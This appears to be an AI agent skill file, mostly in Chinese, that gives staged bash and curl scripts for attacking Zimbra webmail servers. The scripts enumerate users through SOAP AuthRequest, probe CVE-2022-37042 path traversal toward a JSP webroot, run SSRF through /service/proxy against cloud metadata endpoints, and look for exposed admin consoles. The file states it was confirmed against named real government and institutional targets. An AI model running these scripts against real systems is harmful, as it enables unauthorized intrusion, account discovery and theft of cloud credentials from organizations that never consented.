---
name: zimbra-attack
description: Zimbra SOAP 用户枚举、CVE-2022-37042，以及 webmail 场景下的 SSRF。
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [linux]
compatibility: Requires curl, nmap, python3, masscan, subfinder, httpx, nuclei
metadata:
  tags: [recon, zimbra, SOAP, user-enum, CVE, email]
  category: recon
  related_skills:
    - exchange-owa-attack
    - port-service-discovery
    - subdomain-enumeration
---

# Zimbra 攻击技能

Zimbra 协作套件的攻击面——无需认证的 SOAP API 用户枚举、版本指纹识别、UploadServlet 路径穿越（CVE-2022-37042）、`/service/proxy` 内部 SSRF 以及管理控制台访问。已在 IGN Argentina（Zimbra 8.8.11，确认 admin 用户，UploadServlet 活跃）、gov-finance-portal（Zimbra webmail，SOAP 认证可用）和 ITERJ（Zimbra webmail 活跃）上确认。

## When to Use

- 目标拥有 `webmail.`、`mail.` 或 `zimbra.` 子域名。
- 邮件服务器重定向到 `/zimbra/` 路径。
- 服务器响应头或页面标题包含 “Zimbra”。
- 在 `subdomain-enumeration` 发现 webmail 主机之后。
- 政府、高校或企业目标（Zimbra 在这些行业很常见）。

## Prerequisites

- 带有 curl、python3 的 `terminal`。
- 目标 Zimbra URL（通常为 `https://webmail.target.com`）。
- 进行 CVE 利用时：需了解目标的 Zimbra 版本。

## How to Run

```bash
# Quick Zimbra detection
curl --max-time 30 --connect-timeout 10 -skI "https://TARGET/" | grep -iE "zimbra|zmail"

# SOAP user enumeration
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://TARGET/service/soap/" \
  -H "Content-Type: application/xml" \
  -d '<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Header><context xmlns="urn:zimbra"/></soap:Header><soap:Body><AuthRequest xmlns="urn:zimbraAccount"><account by="name">admin@TARGET</account><password>test</password></AuthRequest></soap:Body></soap:Envelope>'
```

## 快速参考

| 端点 | 可揭示的内容 | 风险 |
|----------|----------------|------|
| `/service/soap/` | SOAP API——用户枚举、认证测试 | 高 |
| `/service/soap/AuthRequest` | 区分有效用户与错误密码 | 高 |
| `/zimbraAdmin/` | 管理控制台（如果暴露） | 严重 |
| `/service/upload?fmt=ext` | UploadServlet（CVE-2022-37042） | 严重 |
| `/service/proxy?target=` | 内部 SSRF | 严重 |
| `/service/extension/` | 扩展列表 | 中 |
| `/zimbra/downloads/index.html` | 版本泄露 | 中 |
| `/zimbra/skins/_base/logos/LoginBanner.png` | Zimbra 品牌确认 | 信息 |

## Procedure

### 阶段 1 — 检测与版本指纹识别

```bash
TARGET="$1"
OUTDIR="$OUTDIR/zimbra"
mkdir -p "$OUTDIR"

echo "[*] Zimbra detection on $TARGET"

# Check for Zimbra redirect/headers
INITIAL=$(curl -skI --max-time 10 --connect-timeout 10 "https://$TARGET/" 2>/dev/null)
if echo "$INITIAL" | grep -qi "zimbra\|zmail"; then
  echo "[+] Zimbra confirmed in headers"
fi

# Check page title
TITLE=$(curl -sk --max-time 10 --connect-timeout 10 "https://$TARGET/" 2>/dev/null | grep -Po '<title>\K[^<]+')
if echo "$TITLE" | grep -qi "zimbra"; then
  echo "[+] Zimbra confirmed — Title: $TITLE"
fi

# Version from download page
VER=$(curl -sk --max-time 10 --connect-timeout 10 "https://$TARGET/zimbra/downloads/index.html" 2>/dev/null | grep -Eo 'Zimbra[^<]+' | head -1)
if [[ -n "$VER" ]]; then
  echo "[+] Version: $VER"
fi

# Version from SOAP response
SOAP_RESP=$(curl -sk -X POST --max-time 10 --connect-timeout 10 "https://$TARGET/service/soap/" \
  -H "Content-Type: application/xml" \
  -d '<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Header><context xmlns="urn:zimbra"/></soap:Header><soap:Body><GetVersionInfoRequest xmlns="urn:zimbraAdmin"/></soap:Body></soap:Envelope>' 2>/dev/null)
ZIMBRA_VER=$(echo "$SOAP_RESP" | grep -Po '<VersionString>\K[^<]+')
ZIMBRA_RELEASE=$(echo "$SOAP_RESP" | grep -Po '<ReleaseString>\K[^<]+')
if [[ -n "$ZIMBRA_VER" ]]; then
  echo "[+] Zimbra version from SOAP: $ZIMBRA_VER ($ZIMBRA_RELEASE)"
fi
```

### 阶段 2 — SOAP 用户枚举

```bash
TARGET="$1"

echo "[*] SOAP user enumeration on $TARGET"

# Test users
USERS=("admin" "administrator" "spam" "ham" "virus" "galsync" "wiki"
       "user" "webmaster" "info" "contato" "suporte" "test")

for user in "${USERS[@]}"; do
  # AuthRequest with wrong password — differentiates valid vs invalid user
  RESP=$(curl -sk -X POST --max-time 5 --connect-timeout 5 "https://$TARGET/service/soap/" \
    -H "Content-Type: application/xml" \
    -d "<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\"><soap:Header><context xmlns=\"urn:zimbra\"/></soap:Header><soap:Body><AuthRequest xmlns=\"urn:zimbraAccount\"><account by=\"name\">$user@$TARGET_DOMAIN</account><password>wrongpass</password></AuthRequest></soap:Body></soap:Envelope>" 2>/dev/null)

  if echo "$RESP" | grep -q "authentication failed"; then
    echo "  [VALID] $user — user EXISTS (wrong password)"
  elif echo "$RESP" | grep -q "no such account"; then
    echo "  [INVALID] $user — does not exist"
  elif echo "$RESP" | grep -q "<authToken>"; then
    echo "  [CRITICAL] $user — DEFAULT CREDENTIALS!"
  fi
done
```

### 阶段 3 — CVE-2022-37042 UploadServlet 路径穿越

```bash
TARGET="$1"

echo "[*] CVE-2022-37042 check (UploadServlet path traversal)"

# This CVE allows unauthenticated file write via path traversal in UploadServlet
# Affects: Zimbra < 9.0.0 P27, < 8.8.15 P34

UPLOAD_RESP=$(curl -sk -X POST --max-time 10 --connect-timeout 10 "https://$TARGET/service/upload?fmt=extended" \
  -H "Content-Type: application/octet-stream" \
  -d "test" 2>/dev/null)

if echo "$UPLOAD_RESP" | grep -qi "upload\|success\|clientToken"; then
  echo "  [+] UploadServlet ACTIVE — CVE-2022-37042 potentially exploitable"
  echo "  Response: $(echo "$UPLOAD_RESP" | head -1)"

  # Test path traversal (doesn't write — just tests if the endpoint processes it)
  TRAVERSAL_RESP=$(curl -sk -X POST --max-time 10 --connect-timeout 10 "https://$TARGET/service/upload?fmt=extended&lbfums=" \
    -H "Content-Type: application/octet-stream" \
    -d "../../../../../../opt/zimbra/jetty/webapps/zimbra/public/test.jsp" 2>/dev/null)
  if echo "$TRAVERSAL_RESP" | grep -qi "success"; then
    echo "  [CRITICAL] Path traversal appears functional"
  fi
else
  echo "  [-] UploadServlet not accessible (patched or blocked)"
fi
```

### 阶段 4 — 通过 /service/proxy 实现内部 SSRF

```bash
TARGET="$1"

echo "[*] Internal SSRF via /service/proxy"

# Zimbra proxy endpoint allows internal HTTP requests
# Requires LOW-privilege auth, but worth probing unauthenticated

PROXY_TARGETS=(
  "http://localhost:8080/"
  "http://127.0.0.1:7071/"       # Zimbra Admin port
  "http://127.0.0.1:22/"
  "http://169.254.169.254/latest/meta-data/"  # AWS IMDS
  "http://metadata.google.internal/"
)

for pt in "${PROXY_TARGETS[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 --connect-timeout 5 \
    "https://$TARGET/service/proxy?target=${pt}" 2>/dev/null)
  if [[ "$code" == "200" || "$code" == "500" ]]; then
    echo "  [SSRF] $pt → HTTP $code (internal service may be reachable)"
  fi
done
```

### 阶段 5 — Zimbra 管理控制台

```bash
TARGET="$1"

echo "[*] Zimbra Admin console check"

ADMIN_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 --connect-timeout 10 "https://$TARGET/zimbraAdmin/" 2>/dev/null)

if [[ "$ADMIN_CODE" == "200" ]]; then
  echo "  [+] Zimbra Admin console EXPOSED"
elif [[ "$ADMIN_CODE" == "302" ]]; then
  LOCATION=$(curl -skI --max-time 5 --connect-timeout 5 "https://$TARGET/zimbraAdmin/" 2>/dev/null | grep -i "location:" | sed 's/.*: //')
  echo "  [REDIR] Admin console redirects to: $LOCATION"
else
  echo "  [-] Admin console: HTTP $ADMIN_CODE"
fi

# Check port 7071 (Zimbra Admin port, sometimes exposed without reverse proxy)
ADMIN_PORT=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 --connect-timeout 5 "https://$TARGET:7071/zimbraAdmin/" 2>/dev/null)
[[ "$ADMIN_PORT" == "200" ]] && echo "  [CRITICAL] Admin console on port 7071 EXPOSED"
```

## Pitfalls

- **SOAP 用户枚举噪声较大。** 每个请求都会在 Zimbra 审计日志中生成一条登录失败记录。
- **UploadServlet 可能在 nginx 层被拦截。** 如果 Zimbra 位于反向代理之后，即使 servlet 活跃，路径穿越也可能被拦截。
- **代理 SSRF 在较新版本中需要认证。** 在 8.8.15 之前无需认证即可访问。
- **7071 端口上的 Zimbra Admin 默认仅限内部。** 只有在配置错误或端口被转发时才会暴露。

## Verification

- SOAP AuthRequest 必须能区分 “authentication failed”（用户有效）与 “no such account”（用户无效）。
- Zimbra 版本必须从至少 2 个来源确认（SOAP GetVersionInfo、下载页或 banner）。
- UploadServlet 响应必须确认端点会处理上传。
- 所有发现都必须记录确切的 curl 命令和响应。
